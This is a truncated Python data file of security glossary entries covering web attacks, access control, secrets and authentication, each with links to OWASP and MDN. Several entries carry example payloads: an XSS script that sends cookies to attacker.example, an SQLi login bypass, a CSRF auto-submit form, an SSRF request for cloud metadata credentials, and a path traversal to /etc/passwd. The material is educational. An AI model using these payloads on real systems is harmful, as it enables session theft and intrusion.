# Batch 1: Terms 1-35

TERMS_BATCH_1 = {
    "sql-injection": {
        "category": "web-exploitation",
        "difficulty": "beginner",
        "nature": "attack technique",
        "definition": "SQL Injection occurs when untrusted user input is directly concatenated into a dynamic SQL query without parameterization or escaping. This allows an attacker to manipulate query syntax, bypass authentication, exfiltrate database contents, or execute arbitrary database commands. Parameterized queries and prepared statements ensure user input is treated strictly as data rather than executable instructions.",
        "why_matters": "Consistently ranked in the OWASP Top 10 (A03:2021-Injection), SQLi can lead to total database compromise, data breaches, and remote code execution through database extensions. Breaches stemming from SQL injection have exposed hundreds of millions of user records worldwide.",
        "example": "SELECT * FROM users WHERE username = 'admin' OR '1'='1' --' AND password = '';",
        "related": ["input-validation", "least-privilege", "row-level-security"],
        "links": [
            {"title": "OWASP SQL Injection Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"},
            {"title": "PortSwigger Web Security Academy: SQL Injection", "url": "https://portswigger.net/web-security/sql-injection"}
        ]
    },
    "xss": {
        "category": "web-exploitation",
        "difficulty": "beginner",
        "nature": "attack technique",
        "definition": "Cross-Site Scripting (XSS) occurs when an application includes unvalidated or unescaped user input inside a web page returned to other users. Malicious scripts execute within the victim browser context, enabling attackers to hijack sessions, steal cookies, capture keystrokes, or deface websites. XSS is categorized into Stored, Reflected, and DOM-based variants.",
        "why_matters": "XSS undermines the browser same-origin policy, allowing full impersonation of authenticated users and credential theft (OWASP A03:2021). A single stored XSS vulnerability on a social platform or dashboard can trigger self-propagating worms.",
        "example": "<script>fetch('https://attacker.example/steal?c=' + document.cookie);</script>",
        "related": ["content-security-policy", "input-validation", "csrf"],
        "links": [
            {"title": "OWASP Cross Site Scripting (XSS) Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html"},
            {"title": "MDN Web Docs: Cross-site scripting", "url": "https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting"}
        ]
    },
    "csrf": {
        "category": "web-exploitation",
        "difficulty": "intermediate",
        "nature": "attack technique",
        "definition": "Cross-Site Request Forgery (CSRF) tricks an authenticated victim's browser into executing unwanted actions on a trusted web application. Because browsers automatically attach session cookies to ambient cross-origin requests, state-changing endpoints accept the forged request as legitimate. Protection relies on anti-CSRF tokens, SameSite cookie attributes, and re-authentication for sensitive operations.",
        "why_matters": "Enables attackers to perform state changes like password resets, email address changes, or fund transfers on behalf of unsuspecting authenticated users (OWASP A01:2021). Without anti-CSRF tokens or SameSite=Strict/Lax cookies, any third-party website can forge state changes.",
        "example": "<form action=\"https://bank.example/transfer\" method=\"POST\">\n  <input type=\"hidden\" name=\"amount\" value=\"1000\" />\n  <input type=\"hidden\" name=\"to\" value=\"attacker\" />\n</form>\n<script>document.forms[0].submit();</script>",
        "related": ["cors", "xss", "security-headers"],
        "links": [
            {"title": "OWASP Cross-Site Request Forgery Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html"},
            {"title": "PortSwigger Web Security Academy: CSRF", "url": "https://portswigger.net/web-security/csrf"}
        ]
    },
    "cors": {
        "category": "http-networking",
        "difficulty": "intermediate",
        "nature": "defense concept",
        "definition": "Cross-Origin Resource Sharing (CORS) is an HTTP header-based browser mechanism that allows servers to selectively permit resources to be requested from a different origin. By default, the Same-Origin Policy (SOP) blocks frontend JavaScript from reading cross-origin responses. Servers configure CORS headers like Access-Control-Allow-Origin to loosen SOP restrictions safely.",
        "why_matters": "Misconfigured CORS headers, such as reflection of arbitrary Origin headers with Access-Control-Allow-Credentials: true, allow third-party sites to steal private API data via victim browsers. A secure CORS policy prevents ambient credentialed data extraction across origins.",
        "example": "Access-Control-Allow-Origin: https://app.example.com\nAccess-Control-Allow-Methods: GET, POST, OPTIONS\nAccess-Control-Allow-Credentials: true",
        "related": ["csrf", "security-headers", "content-security-policy"],
        "links": [
            {"title": "MDN Web Docs: Cross-Origin Resource Sharing (CORS)", "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS"},
            {"title": "PortSwigger Web Security Academy: CORS", "url": "https://portswigger.net/web-security/cors"}
        ]
    },
    "ssrf": {
        "category": "web-exploitation",
        "difficulty": "advanced",
        "nature": "attack technique",
        "definition": "Server-Side Request Forgery (SSRF) occurs when a web application accepts a remote resource URL from an untrusted source and fetches it without proper validation. The attacker forces the vulnerable server to dispatch HTTP requests to internal services, loopback interfaces, or cloud metadata endpoints. This exposes internal topology, administrative panels, and secret credentials.",
        "why_matters": "Categorized as OWASP A10:2021, SSRF frequently results in cloud account takeover by targeting cloud instance metadata services (e.g. 169.254.169.254 on AWS/GCP). The massive 2019 Capital One breach was executed via an SSRF vulnerability.",
        "example": "POST /api/generate-preview HTTP/1.1\nHost: example.com\nContent-Type: application/json\n\n{\"url\": \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"}",
        "related": ["input-validation", "vpcs", "least-privilege"],
        "links": [
            {"title": "OWASP Server-Side Request Forgery Prevention Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html"},
            {"title": "PortSwigger Web Security Academy: SSRF", "url": "https://portswigger.net/web-security/ssrf"}
        ]
    },
    "idor": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "attack concept",
        "definition": "Insecure Direct Object References (IDOR) occur when an application uses user-supplied input to access database objects or files directly without validating tenant ownership. Attackers simply alter parameter values like numerical IDs or UUIDs to read, mutate, or delete resources belonging to other users. Proper server-side authorization checks on every object lookup are required.",
        "why_matters": "IDOR is a primary subcategory of OWASP A01:2021-Broken Access Control, routinely yielding massive unauthorized data leakage. It allows horizontal and vertical privilege escalation without requiring cryptographic or code-level exploits.",
        "example": "GET /api/invoices/10042 HTTP/1.1\nHost: billing.example.com\nCookie: session=user_99\n# Attacker modifies 10042 to 10043 to view victim invoice",
        "related": ["server-side-authorization", "row-level-security", "least-privilege"],
        "links": [
            {"title": "OWASP Authorization Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"},
            {"title": "PortSwigger Web Security Academy: IDOR", "url": "https://portswigger.net/web-security/access-control/idor"}
        ]
    },
    "path-traversal": {
        "category": "web-exploitation",
        "difficulty": "intermediate",
        "nature": "attack technique",
        "definition": "Path Traversal (also known as Directory Traversal or dot-dot-slash) involves manipulating variables referencing file paths with dot-dot-slash sequences to step out of the restricted root directory. Attackers access arbitrary files on the host filesystem, such as configuration files, source code, or password files. Defensive mitigations include canonicalizing paths and validating against a strict allowlist.",
        "why_matters": "Exposes sensitive system and application files, such as /etc/passwd or application secrets (.env), often escalating to full remote code execution if upload directories are accessible. It represents a classic CWE-22 flaw commonly found in web servers and CMS plugins.",
        "example": "GET /download?file=../../../../etc/passwd HTTP/1.1\nHost: vulnerable.example.com",
        "related": ["input-validation", "file-upload-validation", "least-privilege"],
        "links": [
            {"title": "OWASP Path Traversal", "url": "https://owasp.org/www-community/attacks/Path_Traversal"},
            {"title": "PortSwigger Web Security Academy: File path traversal", "url": "https://portswigger.net/web-security/file-path-traversal"}
        ]
    },
    "mass-assignment": {
        "category": "web-exploitation",
        "difficulty": "intermediate",
        "nature": "attack concept",
        "definition": "Mass Assignment occurs when software frameworks bind client-submitted parameters directly to internal data models or database entities without strict attribute filtering. If developers fail to specify allowed fields, an attacker can append unexpected fields like is_admin or role to JSON request bodies. Mitigation requires explicit schema validation and Data Transfer Objects (DTOs).",
        "why_matters": "Enables unauthorized privilege escalation and tampering with protected business fields (OWASP API8:2023-Security Misconfiguration). Attackers can grant themselves administrative roles or modify billing balances during normal profile updates.",
        "example": "POST /api/users/profile HTTP/1.1\nContent-Type: application/json\n\n{\n  \"name\": \"Alice\",\n  \"email\": \"alice@example.com\",\n  \"is_admin\": true,\n  \"plan\": \"enterprise_free\"\n}",
        "related": ["input-validation", "server-side-authorization", "rbac"],
        "links": [
            {"title": "OWASP Mass Assignment Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html"},
            {"title": "OWASP API Security Top 10", "url": "https://owasp.org/www-project-top-ten/"}
        ]
    },
    "clickjacking": {
        "category": "web-exploitation",
        "difficulty": "intermediate",
        "nature": "attack technique",
        "definition": "Clickjacking (UI redressing) is an attack where an attacker embeds a legitimate target website inside an invisible iframe overlaying a malicious decoy page. When the victim clicks buttons on the decoy site, their clicks hit the underlying sensitive UI controls of the framed authenticated application. Mitigation includes frame-ancestors in Content Security Policy and X-Frame-Options headers.",
        "why_matters": "Bypasses user intentionality to trigger irreversible actions like account deletion, unauthorized purchases, or permission grants. Without frame-busting protections, any authenticated web app can be weaponized inside an attacker-controlled iframe.",
        "example": "<iframe src=\"https://vulnerable-bank.example/transfer?to=attacker\" style=\"opacity:0; position:absolute; top:0; left:0; z-index:2;\"></iframe>\n<button style=\"position:absolute; top:10px; left:10px;\">Click to Claim Free Prize!</button>",
        "related": ["content-security-policy", "security-headers", "csrf"],
        "links": [
            {"title": "OWASP Clickjacking Defense Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Clickjacking_Defense_Cheat_Sheet.html"},
            {"title": "MDN Web Docs: X-Frame-Options", "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options"}
        ]
    },
    "content-security-policy": {
        "category": "web-exploitation",
        "difficulty": "intermediate",
        "nature": "defense tooling",
        "definition": "Content Security Policy (CSP) is an HTTP response header that restricts the resources (scripts, styles, images, frame ancestors) the browser is allowed to load and execute for a given page. By disabling inline script evaluation and enforcing strict source allowlists or cryptographic nonces, CSP acts as a potent defense-in-depth barrier against Cross-Site Scripting (XSS) and data exfiltration. CSP also supports report-only mode for auditability.",
        "why_matters": "CSP serves as the ultimate containment layer when sanitization fails, preventing injected scripts from executing or transmitting exfiltrated data to attacker servers. Properly tuned CSP eliminates entire classes of script injection attacks.",
        "example": "Content-Security-Policy: default-src 'self'; script-src 'self' 'nonce-rAnd0m123'; object-src 'none'; base-uri 'self';",
        "related": ["xss", "security-headers", "clickjacking"],
        "links": [
            {"title": "MDN Web Docs: Content Security Policy (CSP)", "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP"},
            {"title": "OWASP Content Security Policy Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Content_Security_Policy_Cheat_Sheet.html"}
        ]
    },
    "security-headers": {
        "category": "http-networking",
        "difficulty": "beginner",
        "nature": "defense tooling",
        "definition": "Security Headers are standard HTTP response headers that instruct client web browsers to enable protective security controls and policies. Key security headers include Strict-Transport-Security (HSTS), X-Content-Type-Options (nosniff), X-Frame-Options, Content-Security-Policy, and Referrer-Policy. When configured correctly, they dramatically shrink the browser-side attack surface.",
        "why_matters": "Missing security headers expose web applications to MIME-sniffing exploits, SSL-stripping, clickjacking, and cross-origin information leakage. Automated compliance scanners and vulnerability assessments flag missing headers as high-visibility security hygiene gaps.",
        "example": "Strict-Transport-Security: max-age=63072000; includeSubDomains; preload\nX-Content-Type-Options: nosniff\nReferrer-Policy: strict-origin-when-cross-origin\nX-Frame-Options: DENY",
        "related": ["content-security-policy", "hsts", "clickjacking"],
        "links": [
            {"title": "OWASP Secure Headers Project", "url": "https://owasp.org/www-project-secure-headers/"},
            {"title": "MDN Web Docs: HTTP Headers", "url": "https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers"}
        ]
    },
    "input-validation": {
        "category": "secure-sdlc",
        "difficulty": "beginner",
        "nature": "defense concept",
        "definition": "Input Validation is the defensive practice of enforcing strict syntax, length, type, and semantic constraints on all incoming data before it is processed by business logic. Applications should adopt allowlist validation ('positive security model') rather than blocklist filtering. Proper validation works in tandem with output encoding and parameterized APIs to neutralize injection attacks.",
        "why_matters": "Lack of input validation is the root cause of SQL injection, command execution, path traversal, and buffer overflows. Enforcing boundary validations at system entry points prevents malformed inputs from corrupting downstream services.",
        "example": "# Python Pydantic input validation\nfrom pydantic import BaseModel, Field, EmailStr\n\nclass UserRegistration(BaseModel):\n    username: str = Field(min_length=3, max_length=32, pattern=r'^[a-zA-Z0-9_-]+$')\n    email: EmailStr\n    age: int = Field(ge=18, le=120)",
        "related": ["sql-injection", "xss", "path-traversal"],
        "links": [
            {"title": "OWASP Input Validation Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html"},
            {"title": "OWASP Top 10: Injection", "url": "https://owasp.org/Top10/A03_2021-Injection/"}
        ]
    },
    "server-side-authorization": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "defense concept",
        "definition": "Server-Side Authorization is the authoritative verification performed on the server to determine whether an authenticated principal has permission to perform a requested action on a target resource. Client-side access checks provide user experience guidance but provide zero security guarantees. Server authorization logic must intercept every API endpoint and database mutation unconditionally.",
        "why_matters": "Relying on client-side UI toggles or hidden buttons without server validation leads directly to broken access control (OWASP A01:2021), allowing low-privilege users to invoke admin endpoints or tamper with foreign tenant records via tools like curl or Burp Suite.",
        "example": "def update_document(user_id, doc_id, payload):\n    doc = db.get_doc(doc_id)\n    if not doc or doc.tenant_id != current_user.tenant_id:\n        raise Forbidden(\"Access denied to target resource\")\n    return db.update(doc_id, payload)",
        "related": ["idor", "rbac", "least-privilege"],
        "links": [
            {"title": "OWASP Authorization Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"},
            {"title": "OWASP Top 10: Broken Access Control", "url": "https://owasp.org/Top10/A01_2021-Broken_Access_Control/"}
        ]
    },
    "row-level-security": {
        "category": "data-databases",
        "difficulty": "advanced",
        "nature": "defense tooling",
        "definition": "Row-Level Security (RLS) is an enterprise database feature that restricts which table rows can be returned by SELECT queries or affected by INSERT, UPDATE, and DELETE operations based on the executing user context or session variables. Instead of depending entirely on application-layer filtering, the database engine enforces isolation policies intrinsically. PostgreSQL and modern relational engines offer first-class RLS primitives.",
        "why_matters": "RLS guarantees multi-tenant database isolation even if application code suffers an IDOR, SQL injection, or missing WHERE clause bug. It acts as an unbreakable safety net that prevents cross-tenant data leaks directly in the storage engine.",
        "example": "-- PostgreSQL Row Level Security\nALTER TABLE customer_invoices ENABLE ROW LEVEL SECURITY;\n\nCREATE POLICY tenant_isolation_policy ON customer_invoices\n    FOR ALL\n    TO application_role\n    USING (tenant_id = current_setting('app.current_tenant_id')::uuid);",
        "related": ["idor", "server-side-authorization", "least-privilege"],
        "links": [
            {"title": "PostgreSQL Documentation: Row Security Policies", "url": "https://www.postgresql.org/docs/current/ddl-rowsecurity.html"},
            {"title": "OWASP Database Security Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Database_Security_Cheat_Sheet.html"}
        ]
    },
    "least-privilege": {
        "category": "auth-access",
        "difficulty": "beginner",
        "nature": "defense concept",
        "definition": "The Principle of Least Privilege (PoLP) dictates that every user, service, process, and system component must be granted only the minimum permissions and access rights necessary to perform its legitimate function. By constraining administrative capabilities and removing default superuser access, systems minimize the blast radius of any individual compromised credential or exploit.",
        "why_matters": "Violations of least privilege amplify minor vulnerabilities into catastrophic enterprise-wide breaches. A compromised microservice running with root or DB admin privileges allows an attacker to pivot, dump tables, and conquer infrastructure.",
        "example": "-- Database user restricted strictly to reading orders\nREVOKE ALL ON ALL TABLES IN SCHEMA public FROM reporting_svc;\nGRANT SELECT ON TABLE orders, line_items TO reporting_svc;",
        "related": ["rbac", "secrets-management", "non-root-containers"],
        "links": [
            {"title": "NIST Computer Security Resource Center: Least Privilege", "url": "https://csrc.nist.gov/glossary/term/least_privilege"},
            {"title": "OWASP Security Principles", "url": "https://owasp.org/www-community/Access_Control"}
        ]
    },
    "rbac": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "defense concept",
        "definition": "Role-Based Access Control (RBAC) is an authorization paradigm where permissions are associated with specific roles (such as viewer, editor, billing_admin) and subjects (users, service accounts) are assigned to those roles. This separates identity management from privilege configuration, simplifying access reviews and governance across growing teams. RBAC contrasts with Attribute-Based Access Control (ABAC) which evaluates dynamic attributes.",
        "why_matters": "Without structured RBAC, permissions degenerate into an ad-hoc web of hardcoded conditionals and conflicting privilege flags, causing privilege creep and authorization bypasses (OWASP A01:2021).",
        "example": "roles = {\n    'viewer': ['read:document'],\n    'editor': ['read:document', 'write:document'],\n    'admin': ['read:document', 'write:document', 'delete:document', 'manage:users']\n}\n\ndef check_perm(user, required_permission):\n    user_perms = set().union(*[roles[r] for r in user.roles])\n    return required_permission in user_perms",
        "related": ["least-privilege", "server-side-authorization", "idor"],
        "links": [
            {"title": "NIST RBAC Standard", "url": "https://csrc.nist.gov/projects/role-based-access-control"},
            {"title": "OWASP Authorization Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authorization_Cheat_Sheet.html"}
        ]
    },
    "secrets-management": {
        "category": "crypto-identity",
        "difficulty": "intermediate",
        "nature": "defense tooling",
        "definition": "Secrets Management refers to the tools, protocols, and policies used to securely store, retrieve, rotate, and audit digital credentials such as API keys, database passwords, private certificates, and encryption keys. Dedicated secret managers (e.g. HashiCorp Vault, AWS Secrets Manager) encrypt secrets at rest using Hardware Security Modules (HSMs) or envelope encryption, injecting them dynamically into runtime environments.",
        "why_matters": "Hardcoded or unmanaged secrets in source code repositories or build logs are the leading cause of initial access for ransomware and credential harvesting attacks. Dynamic secrets management neutralizes stale credential theft.",
        "example": "# Retrieve secret via Vault CLI\nvault kv get -mount=secret production/database\n# Or fetch via AWS CLI\naws secretsmanager get-secret-value --secret-id prod/db-password",
        "related": ["api-key-rotation", "secret-scanning", "env-in-gitignore"],
        "links": [
            {"title": "OWASP Secrets Management Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Secrets_Management_Cheat_Sheet.html"},
            {"title": "HashiCorp Vault Documentation", "url": "https://developer.hashicorp.com/vault/docs"}
        ]
    },
    "env-in-gitignore": {
        "category": "secure-sdlc",
        "difficulty": "beginner",
        "nature": "defense technique",
        "definition": "Keeping .env files in .gitignore is a foundational security rule that prevents local configuration files containing database passwords, private keys, and third-party API credentials from ever being committed to source control systems. Developers utilize sample files like .env.example with dummy values to document necessary configuration keys without leaking secrets.",
        "why_matters": "Git history is immutable and distributed; once committed to a public or private repo, secrets are cloned to developer laptops and permanently etched in history, often indexed by automated scraping bots within seconds.",
        "example": "# .gitignore\n.env\n.env.local\n.env.*.local\n*.pem\n*.key",
        "related": ["secret-scanning", "secrets-management", "api-key-rotation"],
        "links": [
            {"title": "Git Documentation: gitignore", "url": "https://git-scm.com/docs/gitignore"},
            {"title": "OWASP Key Management Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html"}
        ]
    },
    "api-key-rotation": {
        "category": "crypto-identity",
        "difficulty": "intermediate",
        "nature": "defense technique",
        "definition": "API Key Rotation is the scheduled or automated lifecycle process of invalidating existing cryptographic API credentials and replacing them with newly generated ones. Seamless rotation mechanisms generate a secondary key, deploy it to consumer services with zero downtime, verify successful handshakes, and subsequently decommission the deprecated primary key.",
        "why_matters": "Static API keys that remain unchanged for years accumulate exposure across logs, developer machines, and compromised third-party integrations. Regular automated rotation limits the validity window of leaked credentials to hours or days.",
        "example": "# Initiate AWS KMS key rotation or database credential rotation\naws kms enable-key-rotation --key-id 1234abcd-12ab-34cd-56ef-1234567890ab",
        "related": ["secrets-management", "secret-scanning", "least-privilege"],
        "links": [
            {"title": "OWASP Key Management Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Key_Management_Cheat_Sheet.html"},
            {"title": "Google Cloud Architecture: Key management", "url": "https://cloud.google.com/kms/docs"}
        ]
    },
    "secret-scanning": {
        "category": "secure-sdlc",
        "difficulty": "beginner",
        "nature": "defense tooling",
        "definition": "Secret Scanning is an automated static analysis capability that scans git repositories, commits, pull requests, and CI/CD pipelines using regular expressions and Shannon entropy detection to identify exposed credentials, private keys, and API tokens. Tools like Trufflehog, Gitleaks, and GitHub Secret Scanning alert teams and trigger automated token revocation hooks upon detection.",
        "why_matters": "Automated threat actor bots continuously listen to public git commit streams (GitHub Firehose) to harvest leaked AWS keys and database passwords within seconds of push. Secret scanning blocks leaks via pre-commit hooks or facilitates immediate remediation.",
        "example": "# Run Gitleaks in CI/CD pipeline\ngitleaks detect --source . --verbose --redact",
        "related": ["env-in-gitignore", "secrets-management", "api-key-rotation"],
        "links": [
            {"title": "GitHub Docs: About Secret Scanning", "url": "https://docs.github.com/en/code-security/secret-scanning/about-secret-scanning"},
            {"title": "OWASP DevSecOps Guideline", "url": "https://owasp.org/www-project-devsecops-guideline/"}
        ]
    },
    "hashing-vs-encryption": {
        "category": "crypto-identity",
        "difficulty": "beginner",
        "nature": "concept",
        "definition": "Hashing and encryption are fundamental cryptographic operations with opposing mathematical objectives: hashing is a one-way deterministic mathematical function that maps arbitrary-length inputs to fixed-size digest strings with no mathematical inverse. Encryption is a reversible two-way transformation that protects confidentiality, requiring a secret key to decrypt ciphertext back to plaintext. Passwords must be hashed with slow memory-hard algorithms, while sensitive data in transit or rest is encrypted.",
        "why_matters": "Conflating hashing with encryption leads to critical architectural blunders, such as storing reversible encrypted passwords that can be stolen and decrypted en masse, or using unkeyed fast hashes (MD5, SHA1) that allow rapid rainbow table lookups.",
        "example": "# One-way Hash (SHA-256): Irreversible digest\nsha256('password') -> 5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8\n\n# Reversible Encryption (AES-GCM): Requires key to recover plaintext\nencrypt('secret data', key) -> ciphertext\ndecrypt(ciphertext, key) -> 'secret data'",
        "related": ["password-salting", "bcrypt-and-argon2", "encryption-at-rest"],
        "links": [
            {"title": "OWASP Cryptographic Storage Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Cryptographic_Storage_Cheat_Sheet.html"},
            {"title": "NIST SP 800-175B: Recommendation for Cryptographic Mechanisms", "url": "https://csrc.nist.gov/publications/detail/sp/800-175b/rev-1/final"}
        ]
    },
    "password-salting": {
        "category": "crypto-identity",
        "difficulty": "beginner",
        "nature": "defense technique",
        "definition": "Password Salting is the security technique of appending a unique, cryptographically random byte sequence (the salt) to a plaintext password before passing it through a password hashing function. The salt is stored alongside the resulting hash in the database. Salting ensures that identical user passwords yield distinct hashes, completely neutralizing precomputed dictionary lookups and rainbow table attacks.",
        "why_matters": "Without unique salts per user, an attacker with a leaked hash database can compute a single rainbow table or reverse hash lookups across thousands of users simultaneously. Salting forces the attacker to crack each password hash individually.",
        "example": "import secrets, hashlib\n\nsalt = secrets.token_hex(16)\npassword = \"CorrectHorseBatteryStaple\"\nsalted_hash = hashlib.sha256((salt + password).encode()).hexdigest()\n# Stored record: {'salt': salt, 'hash': salted_hash}",
        "related": ["hashing-vs-encryption", "bcrypt-and-argon2", "brute-force-protection"],
        "links": [
            {"title": "OWASP Password Storage Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"},
            {"title": "NIST Digital Identity Guidelines: Authentication", "url": "https://pages.nist.gov/800-63-3/sp800-63b.html"}
        ]
    },
    "bcrypt-and-argon2": {
        "category": "crypto-identity",
        "difficulty": "intermediate",
        "nature": "defense tooling",
        "definition": "bcrypt and Argon2 are purpose-built, memory-hard, computationally slow cryptographic password hashing algorithms designed to withstand brute-force attacks by custom hardware, GPUs, and ASICs. bcrypt employs an adaptive work factor (cost parameter) based on the Blowfish cipher. Argon2 (winner of the Password Hashing Competition) adds configurable memory hardness, time cost, and parallelism parameters to neutralize GPU acceleration.",
        "why_matters": "Fast general-purpose hashes like SHA-256 or MD5 can be evaluated billions of times per second on consumer GPUs. Adaptive algorithms like Argon2id and bcrypt slow cracking speeds down to fractions of a second per attempt, making mass offline password cracking economically infeasible.",
        "example": "# Argon2id password hash generation in Python\nfrom argon2 import PasswordHasher\n\nph = PasswordHasher(time_cost=3, memory_cost=65536, parallelism=4)\nhash = ph.hash(\"SuperSecretPassword123!\")\n# Verifying password\nph.verify(hash, \"SuperSecretPassword123!\")",
        "related": ["password-salting", "hashing-vs-encryption", "brute-force-protection"],
        "links": [
            {"title": "OWASP Password Storage Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Password_Storage_Cheat_Sheet.html"},
            {"title": "Argon2 IETF RFC 9106", "url": "https://datatracker.ietf.org/doc/html/rfc9106"}
        ]
    },
    "jwt-expiry": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "defense concept",
        "definition": "JSON Web Token (JWT) Expiry is enforced via the standardized 'exp' (expiration time) claim defined in RFC 7519. Because stateless JWTs cannot be revoked instantly without maintaining a distributed revocation blocklist, setting a short time-to-live (e.g., 5 to 15 minutes) limits the window of opportunity if a token is stolen. Client applications exchange long-lived refresh tokens to obtain fresh short-lived access JWTs.",
        "why_matters": "An unexpired stolen JWT grants continuous, untraceable access to APIs until it lapses. Enforcing tight expiration boundaries combined with token revocation checks limits breach impact following credential exposure or XSS exfiltration.",
        "example": "{\n  \"sub\": \"usr_8832a10\",\n  \"iat\": 1718000000,\n  \"exp\": 1718000900,\n  \"scope\": \"read:profile write:orders\"\n}",
        "related": ["refresh-tokens", "oauth-2-0", "session-fixation"],
        "links": [
            {"title": "RFC 7519: JSON Web Token (JWT)", "url": "https://datatracker.ietf.org/doc/html/rfc7519"},
            {"title": "OWASP JSON Web Token Cheat Sheet", "url": "https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html"}
        ]
    },
    "refresh-tokens": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "defense concept",
        "definition": "A Refresh Token is a long-lived credential issued alongside a short-lived access token during authentication. While the access token is transmitted on every API request and expires quickly, the refresh token is stored securely (such as in an HttpOnly, Secure cookie) and used exclusively against an authorization server to mint new access tokens. Refresh token rotation invalidates the prior refresh token upon each use.",
        "why_matters": "Refresh tokens enable seamless user sessions without exposing long-lived credentials to public APIs. Refresh token rotation allows detection of token theft: if a previously used refresh token is reused, the auth server immediately invalidates the entire token family.",
        "example": "POST /oauth/token HTTP/1.1\nHost: auth.example.com\nContent-Type: application/x-www-form-urlencoded\n\ngrant_type=refresh_token&refresh_token=rT_89fa12bc900&client_id=web_app",
        "related": ["jwt-expiry", "oauth-2-0", "openid-connect"],
        "links": [
            {"title": "RFC 6749: The OAuth 2.0 Authorization Framework", "url": "https://datatracker.ietf.org/doc/html/rfc6749"},
            {"title": "Auth0 Documentation: Refresh Tokens", "url": "https://auth0.com/docs/secure/tokens/refresh-tokens"}
        ]
    },
    "oauth-2-0": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "concept defense",
        "definition": "OAuth 2.0 (RFC 6749) is the industry-standard delegated authorization framework that enables third-party applications to obtain limited access to an HTTP service on behalf of a resource owner. It replaces username/password sharing with scoped access tokens issued by an authorization server following user consent. Common grant types include Authorization Code with PKCE and Client Credentials.",
        "why_matters": "Prevents third-party applications from directly handling or storing user master passwords. Flaws in OAuth implementation (such as redirect_uri manipulation or CSRF in the auth flow) can allow attackers to hijack authorization codes and take over user accounts.",
        "example": "GET /authorize?response_type=code&client_id=client_123&redirect_uri=https%3A%2F%2Fapp.example%2Fcallback&scope=read%3Aprofile&code_challenge=E9Melhoa2OwvFrEMTJguCHaoeK1t8URWbuGJSstw-cM&code_challenge_method=S256 HTTP/1.1\nHost: auth.provider.com",
        "related": ["openid-connect", "jwt-expiry", "refresh-tokens"],
        "links": [
            {"title": "RFC 6749: OAuth 2.0 Framework", "url": "https://datatracker.ietf.org/doc/html/rfc6749"},
            {"title": "PortSwigger Web Security Academy: OAuth 2.0", "url": "https://portswigger.net/web-security/oauth"}
        ]
    },
    "openid-connect": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "defense concept",
        "definition": "OpenID Connect (OIDC) is an identity layer built on top of the OAuth 2.0 authorization framework. While OAuth 2.0 authorizes access to resources via opaque access tokens, OIDC standardizes federated authentication by introducing the ID Token—a signed JSON Web Token containing cryptographically verified identity claims about the authenticated end-user. It also defines a standardized /userinfo endpoint.",
        "why_matters": "OIDC provides a interoperable Single Sign-On (SSO) protocol across enterprise identity providers (Okta, Azure AD, Google). Using vanilla OAuth for authentication without OIDC claims often leads to insecure custom token handling and impersonation vulnerabilities.",
        "example": "# Decoded OIDC ID Token Payload\n{\n  \"iss\": \"https://accounts.google.com\",\n  \"sub\": \"10982390192039\",\n  \"aud\": \"my-app-client-id\",\n  \"email\": \"user@example.com\",\n  \"email_verified\": true,\n  \"exp\": 1718003600\n}",
        "related": ["oauth-2-0", "jwt-expiry", "mfa"],
        "links": [
            {"title": "OpenID Connect Core 1.0 Specification", "url": "https://openid.net/specs/openid-connect-core-1_0.html"},
            {"title": "Auth0 Documentation: OpenID Connect", "url": "https://auth0.com/docs/authenticate/protocols/openid-connect-protocol"}
        ]
    },
    "session-fixation": {
        "category": "auth-access",
        "difficulty": "intermediate",
        "nature": "attack technique",
        "definition": "Session Fixation is an attack where an adversary establishes a legitimate session identifier on a target application and tricks the victim into authenticating using that predetermined session ID (e.g., via query parameters or subdomain cookie tossing). If the application fails to invalidate the pre-authentication session and issue a fresh session token upon login, the attacker retains access to the authenticated session.",
        "why_matters": "Allows an attacker to bypass authentication mechanisms without guessing or stealing passwords. The canonical defense is to renew the session token immediately upon any privilege escalation or successful login attempt.",
        "example": "# Attacker sends victim a link with fixed session:\nhttps://vulnerable.example.com/login?PHPSESSID=attacker_controlled_session_123\n# If server does not regenerate ID upon login, attacker reuses PHPSESSID",
        "related": ["jwt-expiry", "csrf", "mfa"],
